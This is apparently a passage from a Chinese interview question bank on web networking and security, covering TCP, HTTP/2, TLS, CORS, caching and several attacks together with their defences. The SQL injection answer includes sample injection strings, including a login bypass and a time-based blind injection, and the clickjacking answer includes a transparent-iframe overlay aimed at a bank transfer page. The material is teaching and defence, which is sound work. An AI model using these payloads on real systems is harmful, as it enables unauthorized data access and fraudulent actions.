初始 cwnd 不是固定 1 MSS，现代系统常见初始窗口约 10 MSS
每收到 ACK，cwnd 增加约 1 MSS
每个 RTT 近似翻倍：10 → 20 → 40 → ...
达到 ssthresh 或检测到拥塞后退出
```

### 2. 拥塞避免（Congestion Avoidance）
```
进入拥塞避免后，cwnd 线性增长
经典 Reno 近似每个 RTT 增加 1 MSS
目标是在吞吐量和丢包风险之间折中
```

这就是 AIMD：Additive Increase Multiplicative Decrease，加性增、乘性减。

### 3. 拥塞信号
- RTO 超时：认为拥塞较严重，通常大幅降低 cwnd 并重新慢启动
- 3 个重复 ACK：触发快重传，不等超时立即重传疑似丢失段
- SACK：让发送方知道哪些段已收到，重传更精确
- ECN：网络设备可显式标记拥塞，不一定等到丢包才反馈

### 4. 快恢复（Reno 思路）
```
3 个重复 ACK：
  ssthresh = cwnd / 2
  重传丢失报文
  进入快恢复，避免直接回到极小窗口

RTO 超时：
  ssthresh = cwnd / 2
  cwnd 降到较小初始值，重新慢启动
```

### 常见算法
**Tahoe**：遇到丢包就降到慢启动，保守。

**Reno/NewReno**：用快重传和快恢复改进单包或少量丢包场景。

**CUBIC**：现代 Linux 常见默认算法，用三次函数增长，适合高带宽、长 RTT 网络。

**BBR**：估算瓶颈带宽和最小 RTT，目标是控制队列积压；它不是单纯依赖丢包信号，但不同版本和网络环境下公平性、队列控制表现不同。

### 前端相关意义
- 丢包和高 RTT 会放大首包、资源加载和长连接延迟
- HTTP/2 多路复用仍跑在 TCP 上，丢包可能影响同一连接内所有 stream
- HTTP/3/QUIC 通过独立 stream 减少传输层队头阻塞

<!-- id: net-030; difficulty: 3; tags: SQL注入, 安全, 数据库, 后端; source: 高频 -->
# 什么是 SQL 注入？前端如何防御？

## SQL 注入

SQL 注入是把用户可控输入拼进 SQL 字符串，导致攻击者改变查询语义、绕过权限、读取数据或执行破坏性语句。

### 攻击示例
```sql
-- 代码把 id 直接拼进 SQL
SELECT * FROM users WHERE id = 1 OR 1=1;

-- 登录绕过
SELECT * FROM users
WHERE username = 'admin' AND password = '' OR '1'='1';

-- 时间盲注
SELECT * FROM users WHERE id = 1 AND SLEEP(5);
```

### 根本防御在后端
```js
// ❌ 危险：字符串拼接
const sql = `SELECT * FROM users WHERE id = ${userId}`;

// ✅ 参数化查询 / prepared statement
const [rows] = await db.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId]
);

// ✅ ORM 的安全查询 API
const user = await prisma.user.findUnique({
  where: { id: Number(userId) },
});
```

参数化查询会把 SQL 模板和参数分开处理，参数不会被当作 SQL 语法执行。

### ORM 也要避免 raw SQL 拼接
```js
// ❌ 仍然危险
await prisma.$queryRawUnsafe(`SELECT * FROM users ORDER BY ${sort}`);

// ✅ 动态字段用白名单映射
const sortMap = { createdAt: 'created_at', name: 'name' };
const column = sortMap[sort] ?? 'created_at';
```

动态表名、字段名、排序方向这类不能参数化的位置，要用白名单映射，不要直接使用用户输入。

### 前端能做什么
- 做格式校验和类型转换，例如 ID 只能是数字，日期必须符合范围
- 限制 UI 可选项，例如排序字段来自固定枚举
- 不把数据库连接串、管理 token、内部 SQL 暴露给浏览器
- 对错误信息做通用展示，不把服务端 SQL 报错原样暴露给用户

### 防御纵深
- 最小权限：应用账号只授予必要的 SELECT/INSERT/UPDATE/DELETE
- 关闭多语句执行，减少 `; DROP TABLE` 类攻击面
- 统一审计异常查询、慢查询和认证失败
- WAF/网关只能辅助拦截，不能替代参数化查询

结论：前端校验能减少误输入和低级攻击流量，但不能作为 SQL 注入的安全边界；安全边界必须在后端和数据库访问层。

<!-- id: net-031; difficulty: 2; tags: HSTS, HTTPS, 安全, 中间人攻击; source: 高频 -->
# 什么是 HSTS？如何防止协议降级攻击？

## HSTS（HTTP Strict Transport Security）

HSTS 通过响应头告诉浏览器：这个域名在一段时间内只能用 HTTPS 访问。后续用户输入 `http://` 或点击 HTTP 链接时，浏览器会在发出网络请求前内部升级到 HTTPS。

### 工作原理
```
1. 用户访问 https://example.com
2. 服务器返回：
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
3. 浏览器把 example.com 记入 HSTS 列表
4. 再访问 http://example.com：
   浏览器直接改成 https://example.com，不发送明文 HTTP 请求
```

HSTS 头只会在 HTTPS 响应中生效，浏览器会忽略 HTTP 明文响应里的 HSTS。启用 HSTS 后，如果证书错误，浏览器通常不允许用户继续绕过。

### 配置
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

```js
import helmet from 'helmet';

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: false,
}));
```

### 参数说明
```
max-age=31536000   记住策略的秒数；0 表示清除策略
includeSubDomains  子域名也强制 HTTPS，开启前要确认所有子域都支持 HTTPS
preload            表示准备提交到浏览器内置预加载列表
```

### HSTS Preload
预加载列表会被浏览器内置，能解决“首次访问还没收到 HSTS 头”的问题。提交前通常要满足：有效证书、HTTP 自动跳转到 HTTPS、所有子域支持 HTTPS、`max-age >= 31536000`、带 `includeSubDomains` 和 `preload`。

预加载很难快速撤回，适合 HTTPS 覆盖完整、运维成熟的主域名；灰度时先用较小 `max-age`，确认无问题再逐步增大并考虑 `includeSubDomains`。

### 防御效果与边界
- 防 SSL Stripping：攻击者无法把后续访问降级成 HTTP
- 降低用户误点 HTTP 链接的风险
- 不能修复首次访问风险，除非域名已 preload
- 不能替代证书校验、TLS 配置和应用层鉴权

<!-- id: net-032; difficulty: 2; tags: AbortController, Fetch, 超时, 取消请求; source: 高频 -->
# 如何实现前端请求的取消和超时控制？

## 请求取消和超时控制

`fetch` 原生不接受 `timeout` 参数，取消和超时都应通过 `AbortController` / `AbortSignal` 实现。只用 `Promise.race` 让调用方超时返回，并不会真正中止底层网络请求。

### 基础取消
```js
const controller = new AbortController();

try {
  const res = await fetch('/api/data', { signal: controller.signal });
  const data = await res.json();
} catch (e) {
  if (e.name === 'AbortError') {
    console.log('请求被取消');
  } else {
    throw e;
  }
}

controller.abort('user canceled');
```

### 超时控制
```js
async function fetchWithTimeout(url, options = {}) {
  const { timeout = 5000, signal: outerSignal, ...rest } = options;
  const timeoutSignal = AbortSignal.timeout(timeout);

  const signal = outerSignal
    ? AbortSignal.any([outerSignal, timeoutSignal])
    : timeoutSignal;

  const res = await fetch(url, { ...rest, signal });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}
```

如果运行环境不支持 `AbortSignal.timeout()` 或 `AbortSignal.any()`，可以手动合并信号：

```js
function mergeAbortSignals(signals) {
  const controller = new AbortController();

  for (const signal of signals.filter(Boolean)) {
    if (signal.aborted) {
      controller.abort(signal.reason);
      break;
    }
    signal.addEventListener('abort', () => controller.abort(signal.reason), { once: true });
  }

  return controller.signal;
}
```

### React 中取消过期请求
```jsx
useEffect(() => {
  const controller = new AbortController();

  async function loadUser() {
    try {
      const res = await fetch(`/api/users/${userId}`, { signal: controller.signal });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      if (!controller.signal.aborted) setUser(data);
    } catch (e) {
      if (e.name !== 'AbortError' && e.name !== 'TimeoutError') {
        setError(e.message);
      }
    }
  }

  loadUser();
  return () => controller.abort();
}, [userId]);
```

### Axios 取消
```js
const controller = new AbortController();
axios.get('/api/data', { signal: controller.signal });
controller.abort();
```

Axios 旧版 `CancelToken` 已不推荐，新代码优先使用标准 `AbortController`。

<!-- id: net-033; difficulty: 3; tags: HTTP/2, 多路复用, 帧, HPACK; source: 高频 -->
# HTTP/2 的多路复用是如何实现的？帧（Frame）是什么？

## HTTP/2 多路复用与帧

HTTP/2 把 HTTP 消息拆成二进制帧，在同一条连接上按 stream 交错发送，从而让多个请求/响应并发进行。

### 帧（Frame）
```
HTTP/2 Frame Header（9 字节）
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+----------------+
|R|          Stream Identifier (31)              |
+------------------------------------------------+
|               Frame Payload ...               |
+------------------------------------------------+
```

- `Length`：payload 长度，默认最大帧负载通常是 16384 字节，可通过 SETTINGS 调整
- `Type`：DATA、HEADERS、SETTINGS 等帧类型
- `Flags`：END_STREAM、END_HEADERS 等标志
- `Stream Identifier`：所属流；0 表示连接级帧

### Stream 与多路复用
```
Stream 1：GET /index.html
Stream 3：GET /app.js
Stream 5：GET /style.css

交错传输：
S1 HEADERS → S3 HEADERS → S5 HEADERS → S1 DATA → S5 DATA → S3 DATA
```

一个 stream 通常对应一次请求/响应交换。客户端主动发起的 stream ID 是奇数，服务端主动发起的是偶数。不同 stream 的帧可以交错，响应不必按请求顺序完成。

### 常见帧类型
```
DATA             HTTP 消息体
HEADERS          请求/响应头，包含 :method、:path、:status 等伪头
SETTINGS         连接参数协商
RST_STREAM       重置某个流
WINDOW_UPDATE    流级或连接级流量控制
GOAWAY           优雅关闭连接，告知最后处理的 stream
CONTINUATION     HEADERS 太长时续传头块
PRIORITY         旧优先级机制，已被 HTTP/2 最新规范标为 deprecated
PUSH_PROMISE     服务端推送，现代浏览器支持度很弱，Chrome 已默认移除
```

### 解决了什么问题
- HTTP/1.1 常规模式要多个 TCP 连接并发，连接数多且握手成本高
- HTTP/1.1 pipelining 响应必须按序返回，慢响应会阻塞后续响应
- HTTP/2 在应用层解决队头阻塞，多个 stream 共用一个连接并发传输
- 但 HTTP/2 仍跑在 TCP 上，TCP 丢包会阻塞同一连接内后续字节；HTTP/3/QUIC 用独立 stream 缓解传输层队头阻塞

### HPACK 头部压缩
```
静态表：预定义常见头和值，例如 :method GET、:status 200
动态表：连接级字典，后续头部可用索引引用
Huffman 编码：压缩字符串
```

动态表提升压缩率，但也意味着连接两端要维护一致的头部压缩状态。

<!-- id: net-034; difficulty: 3; tags: MITM, 中间人攻击, HSTS, 证书, 安全; source: 高频 -->
# 什么是中间人攻击（MITM）？如何防御？

## 中间人攻击（MITM）

中间人攻击是攻击者插入通信链路，在客户端和服务端都不知情的情况下窃听、篡改或重放数据。

### 常见方式
**ARP 欺骗**：局域网内伪装成网关，让受害者把流量发给攻击者。

**DNS 劫持**：把真实域名解析到攻击者服务器，配合钓鱼页面或伪造证书攻击。

**SSL Stripping**：用户访问 HTTP 入口时，攻击者与服务端走 HTTPS，但与用户保持 HTTP 明文，从而降级通信。

**伪造或滥用证书**：自签名证书会触发浏览器错误；如果用户安装了恶意根证书，攻击者可签发看似可信的站点证书。

### 防御措施
1. **全站 HTTPS**
   - 使用 TLS 加密和完整性保护，防止明文窃听与篡改
   - 不要忽略证书错误，不要在客户端关闭证书校验

2. **HSTS + preload**
   ```http
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ```
   HSTS 能防止后续访问被降级到 HTTP；preload 可覆盖首次访问风险。

3. **正确的证书链和现代 TLS 配置**
   - 部署完整中间证书链
   - 禁用过时 TLS 版本和弱加密套件
   - 关注 Certificate Transparency、证书吊销和自动续期

4. **Subresource Integrity（SRI）**
   ```html
   <script
     src="https://cdn.example.com/lib.js"
     integrity="sha384-..."
     crossorigin="anonymous"></script>
   ```
   SRI 能发现 CDN 脚本被篡改；跨域资源通常需要配合 `crossorigin`。

5. **证书固定要谨慎**
   - 浏览器 Web 页面无法直接做可靠的证书固定，HPKP 已被废弃
   - 移动端、桌面端、Electron 或内部 API 客户端可以固定公钥/SPKI 指纹
   - 固定策略必须设计备份 key 和轮换流程，否则容易把自己锁死

6. **其他辅助措施**
   - 使用安全 DNS、可信网络、VPN 或企业代理策略降低劫持风险
   - 登录态 Cookie 配置 `Secure; HttpOnly; SameSite`
   - 混合内容全部升级或阻止，避免 HTTPS 页面加载 HTTP 子资源

<!-- id: net-035; difficulty: 3; tags: 请求重试, 指数退避, Axios, React Query; source: 高频 -->
# 如何实现前端请求的重试机制？

## 请求重试机制

重试不是“失败就再发一次”。要先判断是否可重试、是否幂等、是否超过预算，并使用指数退避和随机抖动避免雪崩。

### 什么请求适合重试
- 网络错误、超时、连接被重置
- `408 Request Timeout`
- `429 Too Many Requests`，优先遵守 `Retry-After`
- `500/502/503/504` 这类临时服务端错误
- `GET/HEAD/OPTIONS/DELETE` 通常更适合重试；`POST/PATCH` 需要业务幂等键，例如 `Idempotency-Key`

不应重试：认证失败 `401`、无权限 `403`、参数错误 `400/422`、用户主动取消请求。

### Fetch 实现
```js
function sleep(ms, signal) {
  return new Promise((resolve, reject) => {
    const id = setTimeout(resolve, ms);
    signal?.addEventListener('abort', () => {
      clearTimeout(id);
      reject(signal.reason ?? new DOMException('Aborted', 'AbortError'));
    }, { once: true });
  });
}

function retryAfterToMs(value) {
  if (!value) return null;
  const seconds = Number(value);
  if (Number.isFinite(seconds)) return seconds * 1000;
  const date = Date.parse(value);
  return Number.isFinite(date) ? Math.max(0, date - Date.now()) : null;
}

function shouldRetry(res, error) {
  if (error?.name === 'AbortError') return false;
  if (error) return true;
  return res.status === 408 || res.status === 429 || [500, 502, 503, 504].includes(res.status);
}

async function fetchWithRetry(url, options = {}) {
  const {
    retries = 3,
    baseDelay = 300,
    maxDelay = 5000,
    signal,
    ...fetchOptions
  } = options;

  for (let attempt = 0; attempt <= retries; attempt++) {
    let response;
    let error;

    try {
      response = await fetch(url, { ...fetchOptions, signal });
      if (!shouldRetry(response)) return response;
    } catch (e) {
      error = e;
      if (!shouldRetry(null, error)) throw error;
    }

    if (attempt === retries) {
      if (error) throw error;
      throw new Error(`HTTP ${response.status}`);
    }

    const retryAfter = response ? retryAfterToMs(response.headers.get('Retry-After')) : null;
    const backoff = Math.min(maxDelay, baseDelay * 2 ** attempt);
    const jitter = Math.random() * backoff; // full jitter
    await sleep(retryAfter ?? jitter, signal);
  }
}
```

### 幂等与业务约束
```js
await fetchWithRetry('/api/orders', {
  method: 'POST',
  headers: { 'Idempotency-Key': crypto.randomUUID() },
  body: JSON.stringify(payload),
});
```

服务端要用幂等键识别同一次业务请求，否则前端重试可能重复创建订单、重复扣款或重复提交表单。

### 库方案
- Axios 可用响应拦截器或 `axios-retry`，但要排除取消请求和不可重试状态码
- TanStack Query 支持 `retry` 和 `retryDelay`，适合查询请求；mutation 是否重试要谨慎
- 统一网关层应记录 `requestId`，方便排查到底是原始请求还是重试请求

<!-- id: net-036; difficulty: 2; tags: HTTPS, SSL Stripping, HSTS, 安全; source: 高频 -->
# 什么是 HTTPS 降级攻击？如何防止？

## HTTPS 降级攻击（SSL Stripping）

降级攻击是中间人把用户和站点之间的安全连接降成不安全连接，典型场景是用户先访问 `http://bank.com`，攻击者拦截 HTTP 入口，不让浏览器跳转到 HTTPS。

### 攻击原理
```
正常：
用户浏览器 ── HTTPS ── bank.com

SSL Stripping：
用户浏览器 ── HTTP ── 攻击者代理 ── HTTPS ── bank.com
```

攻击者可以读取和篡改用户到攻击者之间的 HTTP 明文流量。浏览器不会显示锁图标，但很多用户不会注意到这一点。

### 防御措施
1. **HSTS**
   ```http
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ```
   浏览器收到 HTTPS 响应里的 HSTS 后，会在有效期内把后续 HTTP 访问自动升级为 HTTPS，并且不允许绕过证书错误。HSTS 头通过 HTTP 发送会被浏览器忽略。

2. **HSTS Preload**
   ```http
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   ```
   预加载列表内置在浏览器中，能保护首次访问。提交前要确认主域和所有子域都支持 HTTPS，撤回 preload 通常很慢。

3. **HTTP 到 HTTPS 重定向**
   ```nginx
   server {
     listen 80;
     server_name example.com www.example.com;
     return 301 https://$host$request_uri;
   }

   server {
     listen 443 ssl http2;
     add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
   }
   ```
   301 重定向不能单独防首次降级，因为初始 HTTP 请求已暴露；它应与 HSTS 配合。

4. **Cookie 安全属性**
   ```http
   Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax
   ```
   `Secure` 防止 Cookie 通过 HTTP 明文发送，`HttpOnly` 防止脚本读取，`SameSite` 降低跨站请求风险。

5. **应用层约束**
   - 所有子资源使用 HTTPS，避免 mixed content
   - 不把登录、支付、OAuth 回调等敏感入口暴露在 HTTP
   - 对异常降级、重复重定向和非 HTTPS 来源做监控

<!-- id: net-037; difficulty: 2; tags: 点击劫持, Clickjacking, X-Frame-Options, CSP, 安全; source: 高频 -->
# 什么是点击劫持（Clickjacking）？如何防御？

## 点击劫持（Clickjacking）

点击劫持是攻击者把目标网站放进透明或伪装的 iframe，并在上层放诱导内容，让用户以为点击的是攻击者页面，实际点击的是目标网站按钮。

### 攻击示例
```html
<style>
  .bait { position: absolute; z-index: 1; }
  iframe {
    position: absolute;
    left: 0;
    top: 0;
    width: 240px;
    height: 80px;
    opacity: 0.01;
    z-index: 2;
  }
</style>

<div class="bait">点击领取奖励</div>
<iframe src="https://bank.example/transfer-confirm"></iframe>
```

如果用户已登录目标站点，浏览器会正常带上目标站点 Cookie，于是点击可能触发敏感操作。

### 防御措施
1. **CSP `frame-ancestors`**
   ```http
   Content-Security-Policy: frame-ancestors 'none'
   Content-Security-Policy: frame-ancestors 'self'
   Content-Security-Policy: frame-ancestors 'self' https://partner.example
   ```
   这是现代首选方案，支持多个允许嵌入的来源。`frame-ancestors` 必须通过 HTTP 响应头发送，不能依赖 `<meta>`。

2. **X-Frame-Options**
   ```http
   X-Frame-Options: DENY
   X-Frame-Options: SAMEORIGIN
   ```
   用于兼容旧浏览器。`ALLOW-FROM` 已废弃且兼容性差，不应作为现代方案。

3. **服务端配置**
   ```nginx
   add_header Content-Security-Policy "frame-ancestors 'none'" always;
   add_header X-Frame-Options "DENY" always;
   ```

4. **敏感操作二次确认**
   - 转账、删除、授权等操作要求重新认证或确认码
   - 使用 CSRF token、SameSite Cookie 防止跨站自动提交
   - 重要按钮可要求不可伪造的用户意图，例如短时间动态确认文案

5. **Frame busting 只能辅助**
   ```js
   if (window.top !== window.self) {
     window.top.location = window.self.location;
   }
   ```
   JS 方案可能被 sandbox、CSP、浏览器限制或跨源策略影响，不能作为主要防线。

### 合法嵌入
如果产品需要被合作方 iframe 嵌入，应精确配置允许的父页面来源，并避免直接放开为 `*`。

<!-- id: net-038; difficulty: 2; tags: Cache-Control, 浏览器缓存, CDN缓存; source: 高频 -->
# Cache-Control 指令如何组合？浏览器缓存、CDN 缓存和 no-cache/no-store 有什么区别？

## Cache-Control 与多层缓存策略

### 核心结论
缓存不是只有“强缓存/协商缓存”两种说法。真实项目要同时考虑浏览器私有缓存、CDN/代理共享缓存、资源版本化、用户敏感数据和回源校验。

### 常用指令
```http
Cache-Control: max-age=31536000, immutable
Cache-Control: no-cache
Cache-Control: no-store
Cache-Control: private
Cache-Control: public, s-maxage=600, stale-while-revalidate=30
```

- `max-age`：浏览器缓存新鲜期，单位秒。
- `s-maxage`：共享缓存新鲜期，优先于 CDN/代理上的 `max-age`。
- `immutable`：告诉浏览器资源内容不会变，适合带 hash 的静态资源。
- `no-cache`：可以存，但每次使用前必须向服务器再验证。
- `no-store`：不要存，适合隐私、支付、账号安全等敏感响应。
- `private`：只允许浏览器缓存，不允许 CDN 等共享缓存保存。
- `public`：允许共享缓存保存，常用于公开静态资源。

### 浏览器缓存 vs CDN 缓存
- 浏览器缓存服务单个用户，重点是减少重复下载。
- CDN 缓存服务大量用户，重点是减少回源和降低边缘延迟。
- CDN 必须关注 `Vary`，例如 `Vary: Accept-Encoding`、`Vary: Origin`，否则可能把不该共享的响应错误复用。

### 推荐策略
```http
# HTML：允许存储但每次验证，保证入口文件能更新
Cache-Control: no-cache

# 带 hash 的 JS/CSS：长期缓存
Cache-Control: public, max-age=31536000, immutable

# 公开图片：浏览器和 CDN 都可缓存
Cache-Control: public, max-age=86400, s-maxage=604800

# 用户隐私数据：不落缓存
Cache-Control: no-store
```

### 常见误区
- `no-cache` 不是“不缓存”，而是“使用前必须协商”。
- `Expires` 是旧式绝对时间，存在本地时钟误差问题，优先用 `Cache-Control`。
- 长缓存必须配合文件名 hash，否则上线后用户可能继续拿旧资源。
- API 是否缓存要看业务语义，不是所有接口都应该 `no-store`。

<!-- id: net-039; difficulty: 1; tags: HTTP, 状态码; source: 高频 -->
# 常见 HTTP 状态码有哪些？分别代表什么意思？

## HTTP 状态码

### 1xx 信息性
```
100 Continue              客户端可继续发送请求体
101 Switching Protocols   协议切换，例如 WebSocket Upgrade
103 Early Hints           提前提示可预加载资源
```

### 2xx 成功
```
200 OK                    请求成功
201 Created               资源创建成功，通常带 Location
202 Accepted              已接受但异步处理未完成
204 No Content            成功但无响应体
206 Partial Content       Range 请求成功，支持断点续传
```

### 3xx 重定向 / 缓存
```
301 Moved Permanently     永久重定向，方法可能被历史客户端改成 GET
302 Found                 临时重定向，方法也可能被改成 GET
303 See Other             明确让客户端用 GET 访问另一个 URL
304 Not Modified          协商缓存命中，无响应体
307 Temporary Redirect    临时重定向，保持方法和请求体
308 Permanent Redirect    永久重定向，保持方法和请求体
```

### 4xx 客户端错误
```
400 Bad Request           请求格式错误
401 Unauthorized          未认证或认证失效，需要 WWW-Authenticate 场景常见
403 Forbidden             已认证但无权限，或服务端拒绝访问
404 Not Found             资源不存在
405 Method Not Allowed    方法不允许，应返回 Allow
409 Conflict              状态冲突，例如版本冲突
415 Unsupported Media Type 请求体类型不支持
422 Unprocessable Content 语义校验失败
429 Too Many Requests     限流，常配 Retry-After
```

### 5xx 服务端错误
```
500 Internal Server Error  服务端内部错误
502 Bad Gateway            网关收到上游无效响应
503 Service Unavailable    服务过载或维护，常配 Retry-After
504 Gateway Timeout        网关等待上游超时
```

### 面试常考区分
- `401` 是认证问题，`403` 是授权或访问策略问题
- `301/302` 可能受历史兼容影响改成 GET，`307/308` 保证方法和请求体不变
- `no-cache` 命中再验证成功通常得到 `304`，不是业务失败
- `429/503` 如果有 `Retry-After`，客户端重试应优先遵守

<!-- id: net-040; difficulty: 2; tags: HTTPS, TLS, 加密, 证书; source: 高频 -->
# HTTPS 的工作原理是什么？TLS 握手过程详解？

## HTTPS / TLS 工作原理

HTTPS = HTTP over TLS。TLS 提供三件事：加密防窃听、完整性防篡改、身份认证防冒充。

### TLS 1.3 完整握手（简化）
```
客户端                                      服务器
  │── ClientHello ───────────────────────► │
  │   支持版本、密码套件、随机数、key_share  │
  │                                        │
  │ ◄── ServerHello ────────────────────── │
  │     选择版本/套件、随机数、key_share     │
  │                                        │
  │ ◄── EncryptedExtensions ────────────── │
  │ ◄── Certificate ────────────────────── │
  │ ◄── CertificateVerify ──────────────── │
  │ ◄── Finished ───────────────────────── │
  │                                        │
  │  验证证书链、域名、有效期、用途和签名      │
  │                                        │
  │── Finished ──────────────────────────► │
  │                                        │
  │════ 使用握手派生出的对称密钥保护 HTTP ═══│
```

TLS 1.3 不再使用“客户端生成预主密钥并用服务器 RSA 公钥加密”的密钥交换方式。主流完整握手使用 ECDHE：客户端和服务端交换临时公钥，各自计算共享秘密，再通过 HKDF 派生握手密钥和应用数据密钥。

### 证书验证
```
1. 用本地信任库验证证书链是否能连到受信任 Root CA
2. 验证每级证书签名、有效期、Key Usage / EKU、CA 约束
3. 验证域名是否匹配 SAN，现代浏览器主要看 SAN
4. 检查吊销信息，如 OCSP、CRL、OCSP Stapling、CRLite 等
5. 检查浏览器安全策略，例如 Certificate Transparency 和弱算法限制
```

### 加密如何分工
- **非对称密码学**：用于身份认证和密钥协商，例如 ECDHE、证书签名验证
- **对称加密**：用于传输 HTTP 数据，例如 AES-GCM、ChaCha20-Poly1305
- **完整性保护**：AEAD 同时提供加密和认证，防止密文被静默篡改

### TLS 1.2 vs TLS 1.3
```
TLS 1.2：典型完整握手需要 2-RTT，历史上支持 RSA 密钥交换等旧模式
TLS 1.3：典型完整握手 1-RTT，只保留前向安全模式，握手更多内容被加密
0-RTT：会话恢复时可提前发数据，但有重放风险，只适合幂等请求
```

### 前端相关点
- HTTPS 是 Service Worker、HTTP/2、部分 Web API 的安全上下文前提
- 混合内容会被浏览器拦截或降级风险很高
- 证书错误不能在 Web 前端绕过，应由服务端和运维修复

<!-- id: net-041; difficulty: 2; tags: 跨域, CORS, 同源策略; source: 高频 -->
# 什么是同源策略？CORS 跨域的完整机制是什么？

## 同源策略与 CORS

同源 = 协议、主机、端口完全相同。路径、查询参数不同不影响同源。

```
https://a.com/page  vs https://a.com/other   同源
https://a.com       vs http://a.com          不同源：协议不同
https://a.com       vs https://b.com         不同源：主机不同
https://a.com:443   vs https://a.com:8080    不同源：端口不同
https://a.com       vs https://sub.a.com     不同源：子域也不同源
```

同源策略限制的是浏览器脚本读取跨源响应、操作跨源 DOM 等能力；请求可能已经发出，不能把 CORS 当作服务端鉴权。

### 简单请求
简单请求不会预检，浏览器直接发送，并根据响应头决定前端 JS 能否读取响应。

条件大致是：
```
方法：GET / HEAD / POST
请求头：只使用 CORS safelisted request headers
Content-Type：text/plain、multipart/form-data、application/x-www-form-urlencoded
```

```http
Origin: https://frontend.example

Access-Control-Allow-Origin: https://frontend.example
Vary: Origin
```

如果请求要带 Cookie 或 HTTP 认证：
```js
fetch('https://api.example/user', {
  credentials: 'include',
});
```

```http
Access-Control-Allow-Origin: https://frontend.example
Access-Control-Allow-Credentials: true
```

带 credentials 时不能使用 `Access-Control-Allow-Origin: *`。

### 预检请求
非简单请求会先发 OPTIONS，例如 `PUT/DELETE`、`Content-Type: application/json`、`Authorization` 或自定义请求头。

```http
OPTIONS /api/data HTTP/1.1
Origin: https://frontend.example
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization
```

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.example
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Max-Age: 600
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
```

`Access-Control-Max-Age` 会被浏览器实现设置上限，不要假设写很大就一定长期有效。

### 其他常用响应头
```http
Access-Control-Expose-Headers: X-Request-Id, Content-Disposition
```
默认情况下，前端只能读取少量 safelisted response headers；需要暴露下载文件名、请求 ID 等头时要显式配置。

### 常见方案
- 生产环境：服务端按白名单动态返回允许的 Origin，并加 `Vary: Origin`
- 开发环境：Vite/Webpack dev server proxy 让浏览器看到同源请求
- iframe 跨源通信：使用 `postMessage` 并严格校验 `event.origin`
- JSONP 只支持 GET，安全性差，现代项目不推荐
- `document.domain` 已是历史方案，不应在新项目使用

<!-- id: net-042; difficulty: 1; tags: TCP, 三次握手, 四次挥手; source: 高频 -->
# TCP 三次握手和四次挥手的过程是什么？为什么需要三次？

## TCP 三次握手与四次挥手

### 三次握手
```
客户端                                      服务器
SYN, seq=x ───────────────────────────────►  SYN-SENT / LISTEN
                                             分配连接状态，选择 ISN y
◄──────────────────── SYN+ACK, seq=y, ack=x+1
ACK, ack=y+1 ─────────────────────────────►
连接建立，可以传输数据
```

### 为什么需要三次
1. 双方确认彼此的发送和接收能力可用
2. 双方同步初始序列号 ISN，后续可靠传输要靠序列号和 ACK
3. 避免历史重复 SYN 报文让服务端误建连接；服务端只有收到第三个 ACK 后才确认客户端收到了自己的 SYN+ACK

两次握手无法证明客户端收到了服务端的初始序列号，也更容易被旧报文干扰。

### 连接关闭
TCP 是全双工，两个方向可以独立关闭。常见四报文过程如下：

```
主动关闭方                                  被动关闭方
FIN, seq=u ───────────────────────────────►  我不再发送数据
◄──────────────────────────── ACK, ack=u+1  但我可能还有数据要发
◄──────────────────────────── FIN, seq=v    我也发完了
ACK, ack=v+1 ─────────────────────────────►
主动关闭方进入 TIME_WAIT
```

通常说“四次挥手”，但 ACK 和 FIN 在某些场景也可能合并，重点不是固定四个包，而是两个方向分别关闭。

### TIME_WAIT
主动关闭方发送最后 ACK 后进入 TIME_WAIT，等待 2MSL 左右，具体时长由系统实现决定。

作用：
- 如果最后 ACK 丢失，被动关闭方会重发 FIN，主动关闭方还能再次 ACK
- 让旧连接的迟到报文在网络中自然消失，避免污染相同四元组的新连接

大量短连接会造成 TIME_WAIT 堆积，工程上优先通过 Keep-Alive、连接池、HTTP/2/3 复用降低连接 churn。

<!-- id: net-043; difficulty: 2; tags: HTTP/2, HTTP/3, 性能误区; source: 高频 -->
# HTTP/2 和 HTTP/3 在前端实践中有哪些常见误区？

## HTTP/2/HTTP/3 实践误区

### 核心结论
协议升级能改善传输效率，但不会自动解决所有前端性能问题。资源体积、缓存、关键资源发现、服务端 TTFB 和主线程执行仍然是首屏体验的关键。

### 误区 1：HTTP/2 后文件越碎越好
HTTP/2 多路复用降低了合并文件的必要性，但请求仍有优先级、头部、调度和缓存粒度成本。工程上通常按路由、页面关键路径和缓存生命周期拆分，而不是无限切小。

### 误区 2：HTTP/2 完全解决队头阻塞
HTTP/2 解决的是 HTTP 应用层队头阻塞；因为它仍跑在 TCP 上，底层丢包会影响同一连接上的多个 Stream。弱网下这就是 HTTP/3 的重要价值。

### 误区 3：Server Push 是必用优化
HTTP/2 Server Push 很难预测资源是否真的需要，也容易和浏览器缓存冲突。现代浏览器实践中更推荐 `preload`、`preconnect` 和 `103 Early Hints`。

### 误区 4：HTTP/3 一定比 HTTP/2 快
HTTP/3 在丢包、移动网络切换、长距离链路上更有优势，但在稳定网络、服务端或 CDN 配置一般的场景里未必明显更快。上线前应看真实 RUM 指标。

### 误区 5：0-RTT 没有代价
0-RTT 主要用于连接恢复，可能存在请求重放风险。带副作用的请求不应随意走 0-RTT。

### 面试表达
协议优化要和资源策略一起看：关键资源尽早发现、静态资源长期缓存、HTML 保持可更新、接口减少等待，通常比“只升级协议”更能稳定提升体验。

<!-- id: net-044; difficulty: 2; tags: XSS, 安全, CSP; source: 高频 -->
# 什么是 XSS 攻击？如何防御？

## XSS（跨站脚本攻击）

XSS 是攻击者让不可信脚本在受害者浏览器中以目标站点身份执行，从而窃取数据、发起操作或篡改页面。

### 类型
